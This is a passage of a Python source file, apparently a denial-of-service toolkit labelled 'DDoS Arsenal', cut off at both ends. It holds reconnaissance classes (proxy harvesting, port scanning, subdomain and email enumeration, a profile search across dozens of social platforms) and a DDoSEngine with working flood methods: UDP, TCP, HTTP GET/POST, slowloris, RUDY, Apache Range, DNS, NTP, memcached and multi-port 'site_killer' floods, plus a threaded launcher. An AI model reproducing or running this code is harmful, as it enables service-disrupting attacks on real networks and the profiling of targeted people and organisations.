            for sig in signatures:
                if sig.lower() in str(headers).lower() or sig in response.text.lower():
                    detected.append(waf)
                    break
    except:
        pass
    return list(set(detected))

# ================================================================
# CLASS: ProxyManager
# ================================================================

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.last_update = None
        self.update_interval = 300
        
    def load_proxies(self, sources=None):
        if not sources:
            sources = CONFIG['proxy_sources']
        logger.info(f"Loading proxies from {len(sources)} sources...")
        all_proxies = []
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_ua()})
        
        for source in sources:
            try:
                response = session.get(source, timeout=8)
                if response.status_code == 200:
                    for line in response.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2 and parts[1].isdigit():
                                if 1 <= int(parts[1]) <= 65535:
                                    all_proxies.append(line)
                time.sleep(0.1)
            except:
                pass
        
        self.proxies = list(set(all_proxies))
        random.shuffle(self.proxies)
        self.last_update = time.time()
        logger.success(f"Loaded {len(self.proxies)} unique proxies")
        return self.proxies
    
    def test_proxy(self, proxy, timeout=3):
        try:
            ip, port = proxy.split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, int(port)))
            s.close()
            return True
        except:
            return False
    
    def validate_proxies(self, count=100):
        logger.info(f"Validating {min(count, len(self.proxies))} proxies...")
        valid = []
        test_proxies = self.proxies[:count]
        
        with tqdm(total=len(test_proxies), desc="Validating proxies") as pbar:
            for proxy in test_proxies:
                if self.test_proxy(proxy):
                    valid.append(proxy)
                pbar.update(1)
        
        self.working_proxies = valid
        logger.success(f"{len(valid)} working proxies out of {len(test_proxies)}")
        return valid
    
    def get_proxies(self, count=None, refresh=False):
        if refresh or not self.proxies or (time.time() - self.last_update > self.update_interval):
            self.load_proxies()
        if count:
            return self.proxies[:count]
        return self.proxies
    
    def get_working_proxies(self, count=None):
        if not self.working_proxies:
            self.validate_proxies()
        if count:
            return self.working_proxies[:count]
        return self.working_proxies

# ================================================================
# CLASS: Target
# ================================================================

@dataclass
class Target:
    target: str
    port: Optional[int] = None
    ip: Optional[str] = None
    domain: Optional[str] = None
    hostname: Optional[str] = None
    is_ip: bool = False
    is_domain: bool = False
    is_url: bool = False
    is_email: bool = False
    geo_data: Optional[Dict] = None
    dns_records: Optional[Dict] = None
    whois_data: Optional[Dict] = None
    ssl_cert: Optional[Dict] = None
    http_headers: Optional[Dict] = None
    open_ports: List[int] = field(default_factory=list)
    technologies: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    emails: List[str] = field(default_factory=list)
    urls: List[str] = field(default_factory=list)
    frameworks: List[str] = field(default_factory=list)
    waf: List[str] = field(default_factory=list)
    backups: List[Dict] = field(default_factory=list)
    cookies: Dict = field(default_factory=dict)
    cves: List[str] = field(default_factory=list)
    created_at: str = field(default_factory=get_timestamp)
    
    def __post_init__(self):
        self._analyze()
    
    def _analyze(self):
        if validate_ip(self.target):
            self.is_ip = True
            self.ip = self.target
        elif validate_domain(self.target):
            self.is_domain = True
            self.domain = self.target
            self.ip = resolve_domain(self.target)
        elif self.target.startswith('http'):
            self.is_url = True
            parsed = urlparse(self.target)
            self.domain = parsed.netloc
            self.ip = resolve_domain(self.domain)
        elif validate_email(self.target):
            self.is_email = True
            self.domain = self.target.split('@')[1]
            self.ip = resolve_domain(self.domain)
        else:
            self.ip = resolve_domain(self.target)
            if self.ip:
                self.domain = self.target
                self.is_domain = True
    
    def resolve(self):
        if not self.ip and self.domain:
            self.ip = resolve_domain(self.domain)
        return self.ip
    
    def get_geo(self):
        if not self.geo_data and self.ip:
            self.geo_data = get_geo_ip(self.ip)
        return self.geo_data
    
    def get_dns(self):
        if not self.dns_records and self.domain:
            self.dns_records = get_all_dns_records(self.domain)
        return self.dns_records
    
    def get_whois(self):
        if not self.whois_data and self.domain:
            self.whois_data = get_whois(self.domain)
        return self.whois_data
    
    def get_ssl(self):
        if not self.ssl_cert and self.domain:
            self.ssl_cert = get_ssl_certificate(self.domain)
        return self.ssl_cert
    
    def get_headers(self):
        if not self.http_headers and self.domain:
            url = f"http://{self.domain}"
            self.http_headers = get_http_headers(url)
        return self.http_headers
    
    def scan_ports(self, ports=None):
        if not self.open_ports and self.ip:
            if not ports:
                ports = CONFIG['scan_ports']
            scanner = AdvancedPortScanner(self.ip)
            self.open_ports = scanner.scan_all(ports)
        return self.open_ports
    
    def get_technologies(self):
        if not self.technologies and self.domain:
            self.technologies = get_technology_stack(self.domain)
        return self.technologies
    
    def get_frameworks(self):
        if not self.frameworks and self.domain:
            self.frameworks = framework_detector(self.domain)
        return self.frameworks
    
    def get_waf(self):
        if not self.waf and self.domain:
            self.waf = waf_detector(self.domain)
        return self.waf
    
    def get_backups(self):
        if not self.backups and self.domain:
            self.backups = backup_scanner(self.domain)
        return self.backups
    
    def get_cookies(self):
        if not self.cookies and self.domain:
            self.cookies = cookie_analyzer(self.domain)
        return self.cookies
    
    def get_cves(self):
        if not self.cves and self.domain:
            self.cves = cve_scanner(self.domain)
        return self.cves
    
    def full_scan(self):
        logger.info(f"Performing full scan on {self.target}")
        self.resolve()
        self.get_geo()
        self.get_dns()
        self.get_whois()
        self.get_ssl()
        self.get_headers()
        self.scan_ports()
        self.get_technologies()
        self.get_frameworks()
        self.get_waf()
        self.get_backups()
        self.get_cookies()
        self.get_cves()
        return self

# ================================================================
# CLASS: AdvancedPortScanner
# ================================================================

class AdvancedPortScanner:
    def __init__(self, target, timeout=0.5, max_threads=500):
        self.target = target
        self.timeout = timeout
        self.max_threads = max_threads
        self.open_ports = []
        self.services = {}
        self.banners = {}
        self.lock = threading.Lock()
        self.progress = None
        
    def _get_service_name(self, port):
        common = {
            20: 'FTP-data', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC', 123: 'NTP',
            135: 'MSRPC', 137: 'NetBIOS', 139: 'NetBIOS', 143: 'IMAP',
            161: 'SNMP', 179: 'BGP', 389: 'LDAP', 443: 'HTTPS', 445: 'SMB',
            465: 'SMTPS', 514: 'Syslog', 587: 'SMTP', 631: 'IPP',
            636: 'LDAPS', 873: 'Rsync', 993: 'IMAPS', 995: 'POP3S',
            1080: 'SOCKS', 1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP',
            1900: 'UPnP', 2049: 'NFS', 3306: 'MySQL', 3389: 'RDP',
            5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            6667: 'IRC', 7001: 'WebLogic', 8080: 'HTTP Proxy', 8443: 'HTTPS',
            9200: 'Elasticsearch', 11211: 'Memcached', 27017: 'MongoDB'
        }
        return common.get(port, 'Unknown')
    
    def scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            result = s.connect_ex((self.target, port))
            if result == 0:
                with self.lock:
                    self.open_ports.append(port)
                    self.services[port] = self._get_service_name(port)
                    try:
                        s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                        data = s.recv(1024)
                        self.banners[port] = data[:200].decode('utf-8', errors='ignore')
                    except:
                        self.banners[port] = 'No banner'
            s.close()
        except:
            pass
    
    def scan_all(self, ports=None):
        if not ports:
            ports = CONFIG['common_ports']
        logger.info(f"Scanning {len(ports)} ports on {self.target}")
        self.open_ports = []
        
        with tqdm(total=len(ports), desc="Scanning ports") as pbar:
            threads = []
            for port in ports:
                t = threading.Thread(target=self.scan_port, args=(port,))
                t.daemon = True
                t.start()
                threads.append(t)
                if len(threads) >= self.max_threads:
                    for t in threads:
                        t.join(timeout=0.1)
                    threads = []
                    pbar.update(self.max_threads)
            
            for t in threads:
                t.join(timeout=0.1)
                pbar.update(1)
        
        logger.success(f"Found {len(self.open_ports)} open ports")
        return sorted(self.open_ports)
    
    def get_report(self):
        return [{'port': p, 'service': self.services.get(p, 'Unknown'), 'banner': self.banners.get(p, 'No banner')} for p in sorted(self.open_ports)]

# ================================================================
# CLASS: SubdomainEnumerator
# ================================================================

class SubdomainEnumerator:
    def __init__(self, target, max_threads=200):
        self.target = target
        self.max_threads = max_threads
        self.subdomains = []
        self.lock = threading.Lock()
        
    def enumerate(self, subdomains=None):
        if not subdomains:
            subdomains = CONFIG['subdomain_list']
        logger.info(f"Enumerating {len(subdomains)} subdomains for {self.target}")
        self.subdomains = []
        
        def check_subdomain(sub):
            try:
                domain = f"{sub}.{self.target}"
                ip = socket.gethostbyname(domain)
                with self.lock:
                    self.subdomains.append({'domain': domain, 'ip': ip})
            except:
                pass
        
        with tqdm(total=len(subdomains), desc="Enumerating subdomains") as pbar:
            threads = []
            for sub in subdomains:
                t = threading.Thread(target=check_subdomain, args=(sub,))
                t.daemon = True
                t.start()
                threads.append(t)
                if len(threads) >= self.max_threads:
                    for t in threads:
                        t.join(timeout=0.1)
                    threads = []
                pbar.update(1)
            
            for t in threads:
                t.join(timeout=0.1)
        
        logger.success(f"Found {len(self.subdomains)} subdomains")
        return self.subdomains

# ================================================================
# CLASS: WebAnalyzer
# ================================================================

class WebAnalyzer:
    def __init__(self, target):
        self.target = target
        self.data = {}
        self.session = requests.Session()
        self.session.headers.update(get_headers())
        
    def analyze(self):
        logger.info(f"Analyzing web presence for {self.target}")
        url = self.target if self.target.startswith('http') else f'http://{self.target}'
        https_url = self.target if self.target.startswith('https') else f'https://{self.target}'
        
        for test_url in [https_url, url]:
            try:
                response = self.session.get(test_url, timeout=5, allow_redirects=True)
                if response.status_code < 400:
                    self.data = {
                        'url': test_url,
                        'status': response.status_code,
                        'headers': dict(response.headers),
                        'server': response.headers.get('Server', 'Unknown'),
                        'content_type': response.headers.get('Content-Type', 'Unknown'),
                        'content_length': len(response.content),
                        'title': self._extract_title(response.text),
                        'meta': self._extract_meta(response.text),
                        'links': self._extract_links(response.text),
                        'images': self._extract_images(response.text),
                        'scripts': self._extract_scripts(response.text),
                        'styles': self._extract_styles(response.text),
                        'response_time': response.elapsed.total_seconds(),
                        'cookies': response.cookies.get_dict(),
                        'redirect_history': [r.url for r in response.history],
                        'final_url': response.url,
                        'emails': extract_emails(response.text),
                        'urls': extract_urls(response.text),
                        'domains': extract_domains(response.text),
                        'ips': extract_ips(response.text),
                    }
                    logger.success("Web analysis complete")
                    return self.data
            except:
                continue
        
        logger.error("Web analysis failed")
        return None
    
    def _extract_title(self, html):
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else 'No Title'
    
    def _extract_meta(self, html):
        meta = {}
        for name, content in re.findall(r'<meta\s+name=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', html, re.IGNORECASE):
            meta[name] = content
        for prop, content in re.findall(r'<meta\s+property=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', html, re.IGNORECASE):
            meta[prop] = content
        return meta
    
    def _extract_links(self, html):
        links = re.findall(r'href=["\'](.*?)["\']', html, re.IGNORECASE)
        return list(set(links))[:100]
    
    def _extract_images(self, html):
        images = re.findall(r'src=["\'](.*?\.(?:png|jpg|jpeg|gif|svg|webp|ico))["\']', html, re.IGNORECASE)
        return list(set(images))[:50]
    
    def _extract_scripts(self, html):
        scripts = re.findall(r'src=["\'](.*?\.js)["\']', html, re.IGNORECASE)
        return list(set(scripts))[:50]
    
    def _extract_styles(self, html):
        styles = re.findall(r'href=["\'](.*?\.css)["\']', html, re.IGNORECASE)
        return list(set(styles))[:50]

# ================================================================
# CLASS: EmailExtractor
# ================================================================

class EmailExtractor:
    def __init__(self, target):
        self.target = target
        self.emails = []
        self.domains = []
        
    def extract_from_web(self):
        logger.info(f"Extracting emails from web for {self.target}")
        url = self.target if self.target.startswith('http') else f'http://{self.target}'
        
        try:
            response = requests.get(url, timeout=5, headers=get_headers())
            if response.status_code == 200:
                emails = extract_emails(response.text)
                domain = urlparse(url).netloc or self.target
                emails = [e for e in emails if domain in e or domain.replace('www.', '') in e]
                self.emails.extend(emails)
                logger.success(f"Found {len(emails)} emails from web")
        except:
            pass
        
        return self.emails
    
    def generate_common_emails(self):
        common = ['admin', 'support', 'info', 'contact', 'sales', 'hr', 'jobs', 'webmaster',
                  'postmaster', 'help', 'feedback', 'hello', 'team', 'office', 'mail', 'email',
                  'careers', 'recruitment', 'staff', 'management', 'ceo', 'cfo', 'cto', 'cmo',
                  'cio', 'coo', 'president', 'vp', 'director', 'manager', 'lead', 'head']
        domain = self.target
        if domain.startswith('http'):
            domain = urlparse(domain).netloc
        if domain.startswith('www.'):
            domain = domain[4:]
        
        generated = [f"{user}@{domain}" for user in common]
        self.emails.extend(generated)
        return generated
    
    def extract_all(self):
        self.emails = []
        self.extract_from_web()
        self.generate_common_emails()
        self.emails = list(set(self.emails))
        logger.success(f"Total emails: {len(self.emails)}")
        return self.emails

# ================================================================
# CLASS: SocialMediaSearcher
# ================================================================

class SocialMediaSearcher:
    def __init__(self, target):
        self.target = target
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update(get_headers())
        
    def search_all(self):
        logger.info(f"Searching social media for {self.target}")
        
        platforms = {
            'twitter': f'https://twitter.com/{self.target}',
            'instagram': f'https://instagram.com/{self.target}',
            'github': f'https://github.com/{self.target}',
            'youtube': f'https://youtube.com/@{self.target}',
            'facebook': f'https://facebook.com/{self.target}',
            'linkedin': f'https://linkedin.com/in/{self.target}',
            'reddit': f'https://reddit.com/user/{self.target}',
            'tiktok': f'https://tiktok.com/@{self.target}',
            'telegram': f'https://t.me/{self.target}',
            'vk': f'https://vk.com/{self.target}',
            'pinterest': f'https://pinterest.com/{self.target}',
            'tumblr': f'https://tumblr.com/{self.target}',
            'snapchat': f'https://snapchat.com/add/{self.target}',
            'discord': f'https://discord.com/users/{self.target}',
            'twitch': f'https://twitch.tv/{self.target}',
            'steam': f'https://steamcommunity.com/id/{self.target}',
            'spotify': f'https://open.spotify.com/user/{self.target}',
            'soundcloud': f'https://soundcloud.com/{self.target}',
            'medium': f'https://medium.com/@{self.target}',
            'wordpress': f'https://{self.target}.wordpress.com',
            'blogger': f'https://{self.target}.blogspot.com',
            'flickr': f'https://flickr.com/people/{self.target}',
            'dribbble': f'https://dribbble.com/{self.target}',
            'behance': f'https://behance.net/{self.target}',
            'deviantart': f'https://deviantart.com/{self.target}',
            'patreon': f'https://patreon.com/{self.target}',
            'onlyfans': f'https://onlyfans.com/{self.target}',
            'mixcloud': f'https://mixcloud.com/{self.target}',
            'reverbnation': f'https://reverbnation.com/{self.target}',
            'bandcamp': f'https://bandcamp.com/{self.target}',
            'etsy': f'https://etsy.com/shop/{self.target}',
            'quora': f'https://quora.com/profile/{self.target}',
            'stackoverflow': f'https://stackoverflow.com/users/{self.target}',
            'hackernews': f'https://news.ycombinator.com/user?id={self.target}',
            'producthunt': f'https://producthunt.com/@{self.target}',
            'indiehackers': f'https://indiehackers.com/{self.target}',
            'devto': f'https://dev.to/{self.target}',
            'hashnode': f'https://hashnode.com/@{self.target}',
            'substack': f'https://substack.com/@{self.target}',
        }
        
        for platform, url in platforms.items():
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    self.results[platform] = {
                        'url': url,
                        'found': True,
                        'title': get_page_title(url) if response.status_code == 200 else None,
                    }
                    logger.success(f"{platform.capitalize()}: Found")
                else:
                    self.results[platform] = {'url': url, 'found': False}
            except:
                self.results[platform] = {'url': url, 'found': False}
        
        found = len([p for p, d in self.results.items() if d.get('found')])
        logger.success(f"Found {found} social media profiles")
        return self.results

# ================================================================
# CLASS: DDoSEngine
# ================================================================

class DDoSEngine:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.target_domain = None
        self.threads = 1000
        self.proxies = []
        self.running = False
        self.requests = 0
        self.bytes_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.method = 'mixed'
        self.session = requests.Session()
        self.packet_size = 8192
        self.timeout = 1
        self.delay_min = 0
        self.delay_max = 0.01
        self.duration = 0
        self.start_time = 0
        self.random_ports = False
        self.fragmentation = False
        self.spoof_ips = False
        self.bypass_mode = False
        self.attack_stats = {}
        
    def set_target(self, target, port):
        self.target_ip = resolve_domain(target) or target
        self.target_domain = target if '.' in target and '://' not in target else None
        self.target_port = port
        logger.success(f"Target set: {self.target_domain or self.target_ip}:{port}")
        return self
    
    def set_proxies(self, proxies):
        self.proxies = proxies
        logger.info(f"Loaded {len(proxies)} proxies")
        return self
    
    # ---- Attack Methods ----
    def attack_udp(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            data = random._urandom(self.packet_size)
            if self.fragmentation:
                s.sendto(data[:self.packet_size//2], (self.target_ip, port))
                time.sleep(0.001)
                s.sendto(data[self.packet_size//2:], (self.target_ip, port))
            else:
                s.sendto(data, (self.target_ip, port))
            with self.lock:
                self.requests += 1
                self.bytes_sent += len(data)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_tcp_syn(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            with self.lock:
                self.requests += 1
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_tcp_ack(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            s.send(b'ACK')
            with self.lock:
                self.requests += 1
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_tcp_rst(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            s.close()  # sends RST
            with self.lock:
                self.requests += 1
        except:
            with self.lock:
                self.errors += 1
    
    def attack_http(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            ua = get_random_ua()
            paths = ['/', '/index', '/api', '/wp-admin', '/login', '/images', '/css', '/js']
            params = ['?id='+str(random.randint(1,99999)), '&page='+str(random.randint(1,999)), '']
            req = (f"GET {random.choice(paths)}{random.choice(params)} HTTP/1.1\r\n"
                   f"Host: {self.target_domain or self.target_ip}\r\n"
                   f"User-Agent: {ua}\r\n"
                   f"Accept: */*\r\n"
                   f"Accept-Encoding: gzip, deflate\r\n"
                   f"Connection: close\r\n\r\n").encode()
            s.send(req)
            with self.lock:
                self.requests += 1
                self.bytes_sent += len(req)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_http_post(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            body = f"key={random.randint(1,99999)}&value={random.randint(1,99999)}".encode()
            req = (f"POST /{random.choice(['api','login','submit'])} HTTP/1.1\r\n"
                   f"Host: {self.target_domain or self.target_ip}\r\n"
                   f"Content-Type: application/x-www-form-urlencoded\r\n"
                   f"Content-Length: {len(body)}\r\n"
                   f"User-Agent: {get_random_ua()}\r\n"
                   f"Connection: close\r\n\r\n").encode() + body
            s.send(req)
            with self.lock:
                self.requests += 1
                self.bytes_sent += len(req)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_https(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            context = ssl.create_default_context()
            ssl_sock = context.wrap_socket(s, server_hostname=self.target_domain or self.target_ip)
            ssl_sock.send(b'GET / HTTP/1.0\r\n\r\n')
            with self.lock:
                self.requests += 1
            ssl_sock.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_dns(self, proxy=None):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
            s.sendto(payload, (self.target_ip, 53))
            with self.lock:
                self.requests += 1
                self.bytes_sent += len(payload)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_ntp(self, proxy=None):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
            s.sendto(payload, (self.target_ip, 123))
            with self.lock:
                self.requests += 1
                self.bytes_sent += len(payload)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_memcached(self, proxy=None):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
            s.sendto(payload, (self.target_ip, 11211))
            with self.lock:
                self.requests += 1
                self.bytes_sent += len(payload)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_slowloris(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target_ip, port))
            s.send(b'GET / HTTP/1.1\r\nHost: target\r\n')
            for _ in range(10):
                s.send(f'X-Header: {random.randint(1,9999)}\r\n'.encode())
                time.sleep(0.5)
            with self.lock:
                self.requests += 1
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_rudy(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((self.target_ip, port))
            s.send(b'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 1000\r\n\r\n')
            for _ in range(10):
                s.send(b'a' * 10)
                time.sleep(0.5)
            with self.lock:
                self.requests += 1
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_apache_killer(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            req = (b"GET /? HTTP/1.1\r\n"
                   b"Host: target\r\n"
                   b"Range: bytes=0-18446744073709551615\r\n"
                   b"User-Agent: Mozilla/5.0\r\n\r\n")
            s.send(req)
            with self.lock:
                self.requests += 1
                self.bytes_sent += len(req)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_http2_rapid(self, proxy=None):
        try:
            port = random.randint(1, 65535) if self.random_ports else self.target_port
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            for _ in range(20):
                s.send(b'GET / HTTP/1.1\r\nHost: target\r\n\r\n')
            with self.lock:
                self.requests += 20
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_provider_killer(self, proxy=None):
        try:
            ports = [53, 67, 68, 69, 123, 161, 162, 500, 4500, 5060, 1900, 5353, 11211, 8080, 8443, 80, 443]
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            data = random._urandom(self.packet_size)
            for p in random.sample(ports, k=random.randint(5, len(ports))):
                s.sendto(data, (self.target_ip, p))
                with self.lock:
                    self.requests += 1
                    self.bytes_sent += len(data)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_site_killer(self, proxy=None):
        try:
            ports = [21, 22, 25, 53, 80, 110, 123, 143, 161, 162, 443, 500, 993, 995,
                    1900, 3306, 3389, 4500, 5060, 5061, 5353, 5432, 5900, 6379, 8080,
                    8443, 9200, 9300, 11211, 27017, 5672, 61616, 1883, 8883]
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            data = random._urandom(self.packet_size)
            for p in random.sample(ports, k=random.randint(10, min(20, len(ports)))):
                s.sendto(data, (self.target_ip, p))
                with self.lock:
                    self.requests += 1
                    self.bytes_sent += len(data)
            s.close()
        except:
            with self.lock:
                self.errors += 1
    
    def attack_mixed(self, proxy=None):
        attacks = [
            self.attack_udp, self.attack_tcp_syn, self.attack_tcp_ack, self.attack_tcp_rst,
            self.attack_http, self.attack_http_post, self.attack_https, self.attack_dns,
            self.attack_ntp, self.attack_memcached, self.attack_slowloris,
            self.attack_rudy, self.attack_apache_killer, self.attack_http2_rapid,
            self.attack_provider_killer, self.attack_site_killer
        ]
        random.choice(attacks)(proxy)
    
    # ---- Main Launch ----
    def launch(self):
        if not self.proxies:
            logger.error("No proxies available! Load them first.")
            return None
        if not self.target_ip or not self.target_port:
            logger.error("Target not set! Use option 1.")
            return None
        
        attack_map = {
            'udp': self.attack_udp,
            'tcp': self.attack_tcp_syn,
            'tcp_ack': self.attack_tcp_ack,
            'tcp_rst': self.attack_tcp_rst,
            'http': self.attack_http,
            'http_post': self.attack_http_post,
            'https': self.attack_https,
            'dns': self.attack_dns,
            'ntp': self.attack_ntp,
            'memcached': self.attack_memcached,
            'slowloris': self.attack_slowloris,
            'rudy': self.attack_rudy,
            'apache_killer': self.attack_apache_killer,
            'http2_rapid': self.attack_http2_rapid,
            'provider_killer': self.attack_provider_killer,
            'site_killer': self.attack_site_killer,
        }
        
        attack_func = attack_map.get(self.method, self.attack_mixed)
        
        logger.info(f"🔥 Launching {self.method.upper()} attack on {self.target_domain or self.target_ip}:{self.target_port}")
        logger.info(f"📡 Proxies: {len(self.proxies)} | 🧵 Threads: {self.threads}")
        
        self.running = True
        self.requests = 0
        self.bytes_sent = 0
        self.errors = 0
        self.start_time = time.time()
        
        attack_proxies = self.proxies[:min(self.threads * 2, len(self.proxies))]
        
        with tqdm(total=None, desc="Attacking", unit="req") as pbar:
            while self.running:
                if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                    break
                
                threads = []
                for proxy in attack_proxies[:self.threads]:
                    if not self.running:
                        break
                    t = threading.Thread(target=attack_func, args=(proxy,))
                    t.daemon = True
                    t.start()
                    threads.append(t)
                
                for t in threads:
                    t.join(timeout=0.05)
                
                elapsed = time.time() - self.start_time
                if elapsed > 0:
                    rate = self.requests / elapsed
                    pbar.set_postfix({'Requests': self.requests, 'Rate': f'{rate:.0f}/s', 'Errors': self.errors})
                    pbar.update(len(threads))
                
                random.shuffle(attack_proxies)
                if self.delay_min > 0 or self.delay_max > 0:
                    time.sleep(random.uniform(self.delay_min, self.delay_max))
                else:
                    time.sleep(0.001)
        
        elapsed = time.time() - self.start_time
        rate = self.requests / elapsed if elapsed > 0 else 0
        
        logger.success(f"✅ Attack finished: {self.requests} requests, {self.bytes_sent/1024/1024:.2f} MB, {elapsed:.1f}s, {rate:.0f} req/s")
        
        return {
            'requests': self.requests,
            'bytes': self.bytes_sent,
            'errors': self.errors,
            'time': elapsed,
            'rate': rate,
        }

# ================================================================
# CLASS: ReportGenerator
# ================================================================

class ReportGenerator:
    def __init__(self):
        self.report = {}
        self.timestamp = get_timestamp()
    
    def add_section(self, name, data):
        self.report[name] = data
        return self
    
    def generate_text(self):
        output = []
        output.append("="*80)
        output.append(f"DDOS ARSENAL REPORT - {self.timestamp}")
        output.append(f"AUTHOR: {AUTHOR} | VERSION: {VERSION}")
        output.append("="*80)
        output.append("")
        
        for section, data in self.report.items():
            output.append(f"[{section.upper()}]")
            if isinstance(data, dict):
                for key, value in data.items():
                    output.append(f"  {key}: {value}")
            elif isinstance(data, list):
                for item in data:
                    output.append(f"  - {item}")
            else:
                output.append(f"  {data}")
            output.append("")
        
        return "\n".join(output)
    
    def generate_json(self):
        return {
            'report': self.report,
            'timestamp': self.timestamp,
            'author': AUTHOR,
            'version': VERSION,
        }
    
    def save_text(self, filename):
        with open(filename, 'w') as f:
            f.write(self.generate_text())
        logger.success(f"📁 Text report saved to {filename}")
    
    def save_json(self, filename):
        with open(filename, 'w') as f:
            json.dump(self.generate_json(), f, indent=2, default=str)
        logger.success(f"📁 JSON report saved to {filename}")

# ================================================================
# MAIN APPLICATION
# ================================================================

class Application:
    def __init__(self):
        self.ddos = DDoSEngine()
        self.proxy_manager = ProxyManager()
        self.current_target = None
        self.quote_idx = 0
        self.quote_time = time.time()
        self.results = {}
        self.report = ReportGenerator()
        self.is_running = False
        
    def get_quote(self):
        now = time.time()
        if now - self.quote_time >= 60:
            self.quote_idx = (self.quote_idx + 1) % len(QUOTES)
            self.quote_time = now
        return QUOTES[self.quote_idx]
    
    def animate_logo(self):
        clear_screen()
        w, h = get_terminal_size()
        lines = LOGO.split('\n')
        max_len = max((len(l) for l in lines), default=80)
        top = max(0, (h - len(lines)) // 2 - 6)
        online = check_internet()
        
        for frame in range(60):
            clear_screen()
            print('\n' * top, end='')
            
            for i, line in enumerate(lines):
                if not line.strip():
                    print()
                    continue
                pad = max(0, (w - max_len) // 2)
                print(' ' * pad, end='')
                colored = ""
                for j, ch in enumerate(line):
                    if ch != ' ':
                        val = (j + frame * 2) % 8
                        if val < 3:
                            colored += f'{C()}{ch}'
                        elif val < 6:
                            colored += f'{B()}{ch}'
                        else:
                            colored += f'{D()}{ch}'
                    else:
                        colored += ch
                print(colored + Style.RESET_ALL)
            
            print('\n' * 2)
            
            status_color = Fore.GREEN if online else Fore.RED
            status_text = "ONLINE" if online else "OFFLINE"
            status_line = f"{status_color}INTERNET: {status_text}{Style.RESET_ALL}"
